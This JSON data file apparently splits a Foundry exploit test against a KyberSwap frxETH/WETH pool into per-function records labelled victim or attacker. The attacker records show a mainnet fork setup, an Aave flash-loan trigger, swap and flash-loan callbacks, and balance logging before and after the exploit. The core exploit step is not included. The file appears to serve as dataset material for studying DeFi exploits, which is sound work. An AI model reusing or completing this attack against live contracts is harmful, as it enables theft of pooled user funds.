[
  {
    "contract/interface": "IUniswapV3Pool",
    "source_type": "victim_contract",
    "function_name": "swap",
    "original_code": "  function swap(\n    address recipient,\n    int256 swapQty,\n    bool isToken0,\n    uint160 limitSqrtP,\n    bytes calldata data\n  ) external returns (int256 qty0, int256 qty1);\n\n  /// @notice Receive token0 and/or token1 and pay it back, plus a fee, in the callback\n  /// @dev The caller of this method receives a callback in the form of IFlashCallback#flashCallback\n  /// @dev Fees collected are sent to the feeTo address if it is set in Factory\n  /// @param recipient The address which will receive the token0 and token1 quantities\n  /// @param qty0 token0 quantity to be loaned to the recipient\n  /// @param qty1 token1 quantity to be loaned to the recipient\n  /// @param data Any data to be passed through to the callback\n",
    "description": ""
  },
  {
    "contract/interface": "Logger",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Logger",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Logger",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Logger",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Logger",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Logger",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Logger",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Logger",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Logger",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Logger",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Logger",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IAavePool",
    "source_type": "victim_contract",
    "function_name": "flashLoanSimple",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "KyberswapFrxEthWethPoolExploitTest",
    "source_type": "attacker_contract",
    "function_name": "_amount",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "KyberswapFrxEthWethPoolExploitTest",
    "source_type": "attacker_contract",
    "function_name": "_attacker",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "KyberswapFrxEthWethPoolExploitTest",
    "source_type": "attacker_contract",
    "function_name": "_lender",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "KyberswapFrxEthWethPoolExploitTest",
    "source_type": "attacker_contract",
    "function_name": "_manager",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "KyberswapFrxEthWethPoolExploitTest",
    "source_type": "attacker_contract",
    "function_name": "_token0",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "KyberswapFrxEthWethPoolExploitTest",
    "source_type": "attacker_contract",
    "function_name": "_token1",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "KyberswapFrxEthWethPoolExploitTest",
    "source_type": "attacker_contract",
    "function_name": "_victim",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "KyberswapFrxEthWethPoolExploitTest",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address asset,\n        uint256 amount,\n        uint256 premium,\n        address initiator,\n        bytes memory params\n    ) external returns (bool) {\n        return _flashCallback(amount + premium);\n    }\n\n    // Uniswap v3\n",
    "description": ""
  },
  {
    "contract/interface": "KyberswapFrxEthWethPoolExploitTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(_chain, _block);\n        vm.label(_victim, \"KS2-RT\");\n        vm.label(_lender, \"Aave: Pool V3\");\n        vm.label(_token0, \"frxETH\");\n        vm.label(_token1, \"WETH\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "KyberswapFrxEthWethPoolExploitTest",
    "source_type": "attacker_contract",
    "function_name": "swapCallback",
    "original_code": "    function swapCallback(int256 deltaQty0, int256 deltaQty1, bytes calldata data) external {\n        if (deltaQty0 > 0) {\n            IERC20(_token0).transfer(msg.sender, uint256(deltaQty0));\n        } else if (deltaQty1 > 0) {\n            IERC20(_token1).transfer(msg.sender, uint256(deltaQty1));\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "KyberswapFrxEthWethPoolExploitTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        // track changes\n\n        // log pre-exploit\n        logBalances(\"before\", \"token0\", \"victim\", _victim, _token0);\n        logBalances(\"before\", \"token1\", \"victim\", _victim, _token1);\n        logBalances(\"before\", \"token0\", \"attacker\", _attacker, _token0);\n        logBalances(\"before\", \"token1\", \"attacker\", _attacker, _token1);\n\n        // main\n        trigger();\n\n        // log post-exploit\n        logBalances(\"after\", \"token0\", \"victim\", _victim, _token0);\n        logBalances(\"after\", \"token1\", \"victim\", _victim, _token1);\n        logBalances(\"after\", \"token0\", \"attacker\", _attacker, _token0);\n        logBalances(\"after\", \"token1\", \"attacker\", _attacker, _token1);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "KyberswapFrxEthWethPoolExploitTest",
    "source_type": "attacker_contract",
    "function_name": "trigger",
    "original_code": "    function trigger() public {\n        IAavePool(_lender).flashLoanSimple(address(this), _token1, _amount, \"\", 0);\n    }\n\n    // core ///////////////////////////////////////////////////////////////////\n",
    "description": ""
  },
  {
    "contract/interface": "KyberswapFrxEthWethPoolExploitTest",
    "source_type": "attacker_contract",
    "function_name": "uniswapV3FlashCallback",
    "original_code": "    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        _flashCallback(fee1);\n    }\n",
    "description": ""
  }
]